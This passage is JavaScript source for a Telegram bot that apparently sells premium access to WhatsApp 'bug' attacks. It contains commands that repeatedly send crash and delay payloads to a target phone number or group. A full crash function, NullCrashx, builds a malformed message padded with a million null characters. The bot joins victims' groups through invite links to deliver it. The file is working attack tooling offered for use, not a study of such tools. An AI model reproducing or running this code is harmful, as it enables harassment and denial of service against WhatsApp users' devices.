  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem ID 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem ID 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem ID 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${senderId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${senderId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${senderId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "<blockquote>Xurtanz  [ 𖣂 ]</blockquote>\nList - Premium\n\n";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "HTML" });
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin id.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${senderId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${senderId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${senderId} is already an admin.`);
    }
});

bot.onText(/\/update/, async (msg, match) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, "🔄 Proses Auto Update");

    try {
        await downloadRepo("");

        bot.sendMessage(chatId, "✅ Update selesai!\n🔁 Bot restart otomatis.");

        setTimeout(() => process.exit(0), 1500);
    } catch (e) {
        bot.sendMessage(chatId, "❌ Gagal update, cek repo GitHub atau koneksi.");
        console.log(e);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem id");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin id.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});
// ~ Case Bugs 1
bot.onText(/\/XoForce (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, 
      "<blockquote>Premium Acces</blockquote>\nBuyying Acces? Please Dm Owner !",
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
          ]
        }
      }
    );
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Forclose
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

© Xurtanz`,
      { parse_mode: "HTML" }
    );

    for (let i = 0; i < 500; i++) {
      await ReymonEfcih(sock, target);
      await sleep(1000);
      console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(
      `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Forclose
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

© Xurtanz`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
        }
      }
    );

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/XoForce4 (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, 
      "<blockquote>Premium Acces</blockquote>\nBuyying Acces? Please Dm Owner !",
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
          ]
        }
      }
    );
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Forclose Click
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

© Xurtanz`,
      { parse_mode: "HTML" }
    );

    for (let i = 0; i < 1; i++) {
      await XkaFcClick(sock, target);
      await sleep(1000);
      console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(
      `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Forclose Click
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

© Xurtanz`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
        }
      }
    );

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/XoForce2 (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Forclose spam
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

© Xurtanz 
`, { parse_mode: "HTML" }
    );

    for (let i = 0; i < 50; i++) {
      await ReymonEfcih(sock, target);
      await sleep(800);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(
      `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Forclose spam
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

© Xurtanz 
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/XoForce3 (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Forclose spam
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

© Xurtanz 
`, { parse_mode: "HTML" }
    );

    for (let i = 0; i < 20; i++) {
      await ReymonEfcih(sock, target);
      await sleep(800);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(
      `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Forclose 1 Msg
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

© Xurtanz 
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

async function NullCrashx(groupJid) {
  const msg = generateWAMessageFromContent(
    groupJid,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: groupJid,
              participant: "13135559098@s.whatsapp.net",
              mentionedJid: [groupJid],
              isForwarded: true,
              fromMe: false,
              forwardingScore: 9,
              expiration: 7205,
              ephemeralSettingTimestamp: 2502,
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
              },
              AdReplyInfo: {
                advertiserName: " Null Crash ",
                mediaType: "NONE",
                caption: " X "
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: 7205
                }
              }
            },
            body: {
              text: "@raraa • #scarry 🩸",
              format: "EXTENSIONS_1"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(
    groupJid,
    msg.message,
    {
      messageId: msg.key.id
    }
  );
}

bot.onText(/\/XoDelayGroub$/, async (msg) => {
  bot.sendMessage(msg.chat.id, "Example: /blankgroup https://chat.whatsapp.com/xxxx");
});

bot.onText(/\/XoDelayGroub (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const rawParam = (match && match[1]) ? match[1].trim() : "";
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

 if (!isCmdActive("/blankgroup")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner.");
}
 const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

if (!isPremium && !groupAllowed) {
  return bot.sendMessage(chatId,
    "Fitur ini hanya untuk:\n• User Premium\nATAU\n• Group yang telah diizinkan owner."
  );
}
  if (isGroupOnly() && chatType === 'private') {
    return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @XurooStore");
  }

  if (blacklistedCommands.includes('/invisgroup')) {
    return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+(\?.*)?$/.test(rawParam)) {
    return bot.sendMessage(chatId, "⚠️ Masukkan link grup WhatsApp yang valid!\nContoh: /blankgroup https://chat.whatsapp.com/xxxx");
  }

  try {

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }

const baseCaption = `<blockquote>╭───「 Blank Group Mode 」───
│ 〆 By            : {USER}
│ 〆 Target        : {TARGET}
│ 〆 Dispatch Type : Group Delay Action
│ 〆 Status        : {STATUS}
│ 〆 Date          : {DATE}
╰────────────────</blockquote>`;

    // ===== SEND STATUS (TEXT ONLY - FOTO DIHAPUS) =====
    const safeTarget = escapeHtml(rawParam);
    const safeDate = escapeHtml(date);
    const safeUser = escapeHtml(username);

    const initialCaption = baseCaption
      .replace("{USER}", safeUser)
      .replace("{TARGET}", safeTarget)
      .replace("{DATE}", safeDate)
      .replace("{STATUS}", "Processing...");

    const sentMessage = await bot.sendMessage(chatId, initialCaption, {
      parse_mode: "HTML"
    });

    const scarry = Array.from(sessions.values())[0];
    if (!scarry) {
      await bot.editMessageText(`❌ Tidak ada koneksi WhatsApp aktif.`, {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML"
      });
      return;
    }

    // Extract group code
    const groupCode = rawParam.split("https://chat.whatsapp.com/")[1].split("?")[0];
    let groupJid;

    try {
      groupJid = await scarry.groupAcceptInvite(groupCode);

      await bot.editMessageText(
        baseCaption
          .replace("{USER}", safeUser)
          .replace("{TARGET}", safeTarget)
          .replace("{DATE}", safeDate)
          .replace("{STATUS}", "Joined Group Successfully"),
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML"
        }
      );

    } catch (e) {

      const err = (e?.message || "").toLowerCase();

      if (
        err.includes("forbidden") ||
        err.includes("401") ||
        err.includes("403") ||
        err.includes("not-authorized")
      ) {
        await bot.editMessageText(
`❌ Gagal masuk grup!

Penyebab:
Grup bersifat PRIVATE atau memerlukan persetujuan admin.
Bot tidak diizinkan masuk.`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id
          }
        );
        return;
      }

      // already joined
      if (
        err.includes("already") ||
        err.includes("member") ||
        err.includes("exists") ||
        err.includes("conflict")
      ) {
        try {
          const inviteInfo = await otax.groupGetInviteInfo(groupCode);

          if (!inviteInfo || !inviteInfo.id) {
            await bot.editMessageText(
              `❌ Gagal ambil info grup (inviteInfo kosong / link expired).`,
              {
                chat_id: chatId,
                message_id: sentMessage.message_id
              }
            );
            return;
          }

          groupJid = inviteInfo.id;
        } catch (err2) {
          await bot.editMessageText(
            `❌ Gagal ambil info grup: ${(err2?.message || "forbidden / link expired")}`,
            {
              chat_id: chatId,
              message_id: sentMessage.message_id
            }
          );
          return;
        }
      } else {
        await bot.editMessageText(
          `❌ Gagal join grup: ${e?.message || "Unknown error"}`,
          {
            chat_id: chatId,
            message_id: sentMessage.message_id
          }
        );
        return;
      }
    }

    if (!groupJid || typeof groupJid !== "string" || !groupJid.includes("@g.us")) {
      await bot.editMessageText(
        `❌ groupJid tidak valid (link expired/dibatasi).`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id
        }
      );
      return;
    }

    // ===== SEND PROCESS =====
    console.log("\x1b[33m[PROSES]\x1b[0m Mengirim ke grup...");
    await NullCrashx(groupJid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m berhasil dikirim 🚀");

    // SUCCESS UPDATE
    await bot.editMessageText(
      baseCaption
        .replace("{USER}", safeUser)
        .replace("{TARGET}", safeTarget)
        .replace("{DATE}", safeDate)
        .replace("{STATUS}", "✅ Sukses dikirim!"),
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK • GROUP", url: rawParam }]]
        }
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem.`);
    console.error(error);
  }
});


bot.onText(/\/XoDelay (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Delay Hard
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

© Xurtanz 
`, { parse_mode: "HTML" }
    );

    for (let i = 0; i < 250; i++) {
    await FuncaroHmmM(target);
    await sleep(1500);
    await Delay(sock, target);
    await sleep(1500);
    await Reymon(sock, target);
    await sleep(1500);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(
      `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : DelayHard
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

© Xurtanz 
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/XoDelay5 (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : DelaySpam
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

© Xurtanz 
`, { parse_mode: "HTML" }
    );

    for (let i = 0; i < 3; i++) {
    await FuncaroHmmM(target);
    await sleep(400);
    await Delay(sock, target);
    await sleep(400);
    await Reymon(sock, target);
    await sleep(400);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(
      `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : DelaySpam
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

© Xurtanz 
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


bot.onText(/\/XoDelay2 (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Delay Spam
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

© Xurtanz 
`, { parse_mode: "HTML" }
    );

    for (let i = 0; i < 50; i++) {
    await FuncaroHmmM(target);
    await sleep(800);
    await Delay(sock, target);
    await sleep(800);
    await Reymon(sock, target);
    await sleep(400);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(
      `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Delay Spam
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

© Xurtanz 
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/XoDelay3 (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Delay Spam Hard
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

© Xurtanz 
`, { parse_mode: "HTML" }
    );

    for (let i = 0; i < 60; i++) {
    await FuncaroHmmM(target);
    await sleep(1500);
    await Delay(sock, target);
    await sleep(1500);
    await Reymon(sock, target);
    await sleep(1500);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(
      `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

